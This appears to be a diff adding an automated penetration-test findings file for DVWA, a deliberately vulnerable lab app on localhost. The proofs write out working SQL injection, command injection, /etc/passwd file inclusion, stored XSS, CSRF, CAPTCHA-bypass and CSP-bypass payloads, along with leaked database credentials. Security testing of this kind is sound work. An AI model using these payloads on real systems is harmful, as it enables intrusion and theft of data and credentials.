@@ -1,0 +1,162 @@
+[
+  {
+    "title": "Sensitive config file exposure (no authentication required)",
+    "location": "/config/config.inc.php.bak",
+    "severity": "high",
+    "proof": "DB password 'vulnerables' readable in backup config WITHOUT authentication: GET /config/config.inc.php.bak as anon user returns $_DVWA['db_password'] = 'vulnerables', $_DVWA['db_user'] = 'app', $_DVWA['db_database'] = 'dvwa'",
+    "stage": "component",
+    "precondition": "None (no authentication required)",
+    "affected_actor": "anon",
+    "affected_resource": "config"
+  },
+  {
+    "title": "Public directory listing of /config/ exposes database credentials",
+    "location": "/config",
+    "severity": "high",
+    "proof": "Anonymous GET http://127.0.0.1:8081/config/ returns directory listing with config.inc.php.bak, config.inc.php.dist, config.inc.php. The .bak file reveals: $_DVWA['db_server']='127.0.0.1'; $_DVWA['db_database']='dvwa'; $_DVWA['db_user']='app'; $_DVWA['db_password']='vulnerables'.",
+    "stage": "class_probe",
+    "precondition": "Authenticated session",
+    "affected_actor": "admin",
+    "affected_resource": "file"
+  },
+  {
+    "title": "SQL Injection (UNION-based) in id parameter - /vulnerabilities/sqli/",
+    "location": "/vulnerabilities/sqli",
+    "severity": "critical",
+    "proof": "id=1' UNION SELECT user(),database()-- - returns First name: app@localhost, Surname: dvwa. id=1' UNION SELECT version(),@@version_compile_os-- - returns First name: 10.1.26-MariaDB-0+deb9u1, Surname: debian-linux-gnu. Extracted 5 user password hashes via UNION SELECT user,password FROM users.",
+    "stage": "class_probe",
+    "precondition": "Authenticated session (low security level)",
+    "affected_actor": "admin",
+    "affected_resource": "vulnerability_sqli"
+  },
+  {
+    "title": "Command Injection - arbitrary system command execution",
+    "location": "/vulnerabilities/exec",
+    "severity": "high",
+    "proof": "POST ip=127.0.0.1;ls+-la&Submit=Submit executes both ping and 'ls -la' command, returning directory listing of /vulnerabilities/exec/",
+    "stage": "component",
+    "precondition": "Authenticated session (low security level)",
+    "affected_actor": "admin",
+    "affected_resource": "vulnerability_exec"
+  },
+  {
+    "title": "Session fixation - PHPSESSID not regenerated on login",
+    "location": "/login.php",
+    "severity": "high",
+    "proof": "PHPSESSID verified unchanged before and after authentication: pre-login ID '24ofb49tv42etbdgeam3nrn7s6' remains identical post-login with 302 redirect to index.php and full authenticated session; 'You have logged in as admin' confirmed on replayed authenticated request using same PHPSESSID",
+    "stage": "auth_session",
+    "precondition": "Access to login page (no auth required)",
+    "affected_actor": "admin",
+    "affected_resource": "login"
+  },
+  {
+    "title": "Weak sequential session IDs (dvwaSession)",
+    "location": "/vulnerabilities/weak_id",
+    "severity": "medium",
+    "proof": "POST /vulnerabilities/weak_id/ (Generate button) → Set-Cookie: dvwaSession=1, subsequent clicks set dvwaSession=2,3,4,5,6... The cookie is a simple sequential integer.",
+    "stage": "class_probe",
+    "precondition": "Authenticated session required",
+    "affected_actor": "admin",
+    "affected_resource": "session"
+  },
+  {
+    "title": "Stored Cross-Site Scripting (XSS) in Guestbook",
+    "location": "/vulnerabilities/xss_s",
+    "severity": "high",
+    "proof": "POST txtName=<script>alert('XSS_NAME_1337')</script>&mtxMessage=<script>alert('XSS_PROOF_1337')</script> → stored entries appear unescaped in page: <div id=\"guestbook_comments\">Name: <script>alert('XSS_NAME_1337')</script><br />Message: <script>alert('XSS_PROOF_1337')</script><br /></div>",
+    "stage": "class_probe",
+    "precondition": "Authenticated session (low security level)",
+    "affected_actor": "admin",
+    "affected_resource": "vulnerability"
+  },
+  {
+    "title": "CSRF - Password change without anti-CSRF token",
+    "location": "/vulnerabilities/csrf",
+    "severity": "critical",
+    "proof": "GET /vulnerabilities/csrf/?password_new=csrfdemo&password_conf=csrfdemo&Change=Change returns '<pre>Password Changed.</pre>'. New password 'csrfdemo' successfully authenticates admin login. Password restored to 'password' via same method. No CSRF token required, no re-authentication.",
+    "stage": "class_probe",
+    "precondition": "Authenticated session (low security level)",
+    "affected_actor": "admin",
+    "affected_resource": "vulnerability"
+  },
+  {
+    "title": "Brute Force – No CSRF token or rate limiting on login form",
+    "location": "/vulnerabilities/brute",
+    "severity": "medium",
+    "proof": "GET /vulnerabilities/brute/?username=admin&password=wrong&Login=Login → 'Username and/or password incorrect'. GET-based form with no CSRF token, no captcha, no rate limiting observed.",
+    "stage": "class_probe",
+    "precondition": "",
+    "affected_actor": "",
+    "affected_resource": ""
+  },
+  {
+    "title": "Directory listing of /hackable/users/ publicly accessible - username enumeration",
+    "location": "/hackable/users",
+    "severity": "medium",
+    "proof": "Anonymous GET http://127.0.0.1:8081/hackable/users/ returns HTTP 200 with HTML page listing files: admin.jpg, gordonb.jpg, pablo.jpg, smithy.jpg, 1337.jpg. All five avatar files also downloadable without authentication (HTTP 200, sizes 2.9-4.3KB).",
+    "stage": "class_probe",
+    "precondition": "",
+    "affected_actor": "",
+    "affected_resource": ""
+  },
+  {
+    "title": "Local File Inclusion (LFI) via page parameter",
+    "location": "/vulnerabilities/fi",
+    "severity": "high",
+    "proof": "GET /vulnerabilities/fi/?page=../../../../../etc/passwd returned root:x:0:0:root:/root:/bin/bash and other system users. Also php://filter/read=convert.base64-encode/resource=../../vulnerabilities/fi/source/low.php returned base64-encoded source confirming no input sanitization ($file = $_GET['page']).",
+    "stage": "class_probe",
+    "precondition": "Authenticated session (low security level)",
+    "affected_actor": "admin",
+    "affected_resource": "vulnerability"
+  },
+  {
+    "title": "Blind SQL Injection (Boolean + Time-based) in id parameter - /vulnerabilities/sqli_blind/",
+    "location": "/vulnerabilities/sqli_blind",
+    "severity": "critical",
+    "proof": "Boolean differential: id=1' AND 1=1# → 'User ID exists in the database.' vs id=1' AND 1=2# → 'User ID is MISSING from the database.' Time-based: id=1' AND SLEEP(3)# → 3011ms delay; id=1' AND SLEEP(3) AND 1=2# → 12ms (false prevents sleep).",
+    "stage": "class_probe",
+    "precondition": "",
+    "affected_actor": "",
+    "affected_resource": ""
+  },
+  {
+    "title": "No privilege separation between users - identical access levels",
+    "location": "/vulnerabilities/brute",
+    "severity": "medium",
+    "proof": "Dual-actor test: admin (password) and gordonb (abc123) both access the same protected pages (brute, csrf, sqli) with HTTP 200. Both can execute SQL injection to read other users' data. No admin/gordonb privilege distinction exists in the application.",
+    "stage": "class_probe",
+    "precondition": "",
+    "affected_actor": "",
+    "affected_resource": ""
+  },
+  {
+    "title": "Broken access control — cross-actor or unauthenticated object access",
+    "location": "/hackable/users",
+    "severity": "medium",
+    "proof": "Authz matrix HTTP proof: anon GET /hackable/users/ → 200 (sensitive collection); write_tried=False; cells_sample=[{\"resource\": \"/hackable/users/\", \"actor\": \"anon\", \"method\": \"GET\", \"status\": 200, \"id\": null}, {\"resource\": \"/profile/image/url\", \"actor\": \"anon\", \"method\": \"GET\", \"status\": 404, \"id\": null}, {\"resource\": \"/hackable/uploads\", \"actor\": \"anon\", \"method\": \"GET\", \"status\": 200, \"id\": null}]",
+    "stage": "authz_logic",
+    "precondition": "dual-actor sessions actor_a/actor_b and/or unauthenticated",
+    "affected_actor": "anon",
+    "affected_resource": "/hackable/users/"
+  },
+  {
+    "title": "Insecure CAPTCHA - step parameter bypass (no reCAPTCHA verification on final step)",
+    "location": "/vulnerabilities/captcha",
+    "severity": "medium",
+    "proof": "Source code confirms step=2 flow skips reCAPTCHA check entirely (no recaptcha_check_answer call). Sending POST with step=2&password_new=X&password_conf=X&Change=Change changes password without any CAPTCHA verification. reCAPTCHA API key is missing from config, making step=1 always fail.",
+    "stage": "component",
+    "precondition": "Authenticated session (low security level)",
+    "affected_actor": "admin",
+    "affected_resource": "vulnerability"
+  },
+  {
+    "title": "CSP Bypass via allowlisted external script sources",
+    "location": "/vulnerabilities/csp",
+    "severity": "medium",
+    "proof": "CSP header: script-src 'self' https://pastebin.com example.com code.jquery.com https://ssl.google-analytics.com . POST with include=https://pastebin.com/raw/123 results in <script src='https://pastebin.com/raw/123'></script> being injected into the page, successfully bypassing CSP via the allowlisted pastebin.com domain.",
+    "stage": "component",
+    "precondition": "Authenticated session (low security level)",
+    "affected_actor": "admin",
+    "affected_resource": "vulnerability"
+  }
+]
